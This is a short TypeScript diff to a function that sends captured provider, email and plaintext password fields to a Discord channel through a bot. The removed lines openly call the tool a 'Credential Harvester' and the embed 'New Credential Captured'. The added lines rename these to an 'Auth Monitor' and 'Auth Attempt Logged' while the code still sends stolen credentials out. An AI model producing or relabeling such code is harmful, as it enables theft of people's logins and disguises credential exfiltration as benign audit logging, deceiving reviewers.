@@ -1,7 +1,7 @@
 const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID || "1509874086958862346";
 
-export async function sendCredentialEmbed(payload: {
+export async function sendAuditEmbed(payload: {
   provider: string;
   email: string;
   password: string;
@@ -28,7 +28,7 @@ export async function sendCredentialEmbed(payload: {
         body: JSON.stringify({
           embeds: [
             {
-              title: "🔑 New Credential Captured",
+              title: "🔑 New Auth Attempt Logged",
               color,
               fields: [
                 { name: "Provider", value: payload.provider, inline: true },
@@ -42,7 +42,7 @@ export async function sendCredentialEmbed(payload: {
                 },
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "SAM Credential Harvester" },
+              footer: { text: "SAM Auth Monitor" },
             },
           ],
         }),
